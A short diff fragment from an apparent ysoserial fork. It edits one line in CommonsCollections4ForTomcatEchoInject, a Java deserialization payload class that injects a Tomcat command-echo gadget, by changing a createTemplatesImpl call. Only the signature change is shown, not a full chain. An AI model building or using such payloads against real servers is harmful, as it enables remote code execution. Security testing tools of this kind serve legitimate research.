@@ -25,7 +25,7 @@ import ysoserial.payloads.util.Reflections;
 public class CommonsCollections4ForTomcatEchoInject implements ObjectPayload<Queue<Object>> {
 
 	public Queue<Object> getObject(final String ... command) throws Exception {
-		Object templates = Gadgets.createTemplatesImpl(null, TomcatEchoInject.class);
+		Object templates = Gadgets.createTemplatesImpl(TomcatEchoInject.class);
 
 		ConstantTransformer constant = new ConstantTransformer(String.class);
 
